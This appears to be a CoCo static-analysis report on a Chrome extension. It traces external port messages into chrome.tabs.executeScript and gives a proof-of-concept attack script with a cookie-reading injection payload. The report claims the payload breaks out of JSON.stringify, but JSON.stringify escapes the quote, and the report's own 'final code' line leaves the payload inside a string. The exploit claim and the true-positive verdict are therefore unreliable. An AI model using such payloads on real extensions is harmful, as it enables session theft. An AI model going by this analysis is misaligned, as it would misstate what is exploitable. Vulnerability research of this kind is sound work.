# CoCo Analysis: ndgcaedhafmgcjmbhgleeinpghdonlhd

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_external_port_onMessage → chrome_tabs_executeScript_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/ndgcaedhafmgcjmbhgleeinpghdonlhd/opgen_generated_files/bg.js
Line 1038    exectueCoBrowingCommand(port, msg.command);
Line 1253    chrome.tabs.executeScript(g_cobrowsing_shared_tab_id, {code:'MXCoBrowsing.execute_command('+JSON.stringify(cmd)+')'}, function(result){
```

**Code:**

```javascript
// Background script - External connection listener (bg.js Line 984)
chrome.runtime.onConnectExternal.addListener(function(port) {
    port.onMessage.addListener(function(msg) {
        // Line 1037-1039
        if (msg.type === 'MX_CB_COMMAND') {
            exectueCoBrowingCommand(port, msg.command); // ← attacker-controlled msg.command
        }
    });
});

// Line 1250-1256
function exectueCoBrowingCommand(port, cmd)
{
    if (g_cobrowsing_shared_tab_id!=0) {
        chrome.tabs.executeScript(g_cobrowsing_shared_tab_id, {
            code:'MXCoBrowsing.execute_command('+JSON.stringify(cmd)+')' // ← cmd injected into executeScript
        }, function(result){
        });
    }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External Messages (chrome.runtime.onConnectExternal)

**Attack:**

```javascript
// From a webpage on whitelisted domain (*.moxtra.com, *.grouphour.com, or localhost)
var port = chrome.runtime.connect("ndgcaedhafmgcjmbhgleeinpghdonlhd");

// Send malicious command to execute arbitrary code
port.postMessage({
    type: 'MX_CB_COMMAND',
    command: '"}));alert(document.cookie);//'
});

// The injected payload breaks out of JSON.stringify and executes arbitrary JavaScript
// Final code executed: MXCoBrowsing.execute_command("}));alert(document.cookie);//")
```

**Impact:** Arbitrary code execution in the co-browsing tab. The extension listens to external connections from whitelisted domains (*.moxtra.com, *.grouphour.com, localhost) and accepts commands that are directly injected into executeScript. While JSON.stringify provides some escaping, an attacker from a whitelisted domain can inject arbitrary JavaScript code to be executed in the context of the co-browsing session tab, potentially stealing data or performing actions on behalf of the user.
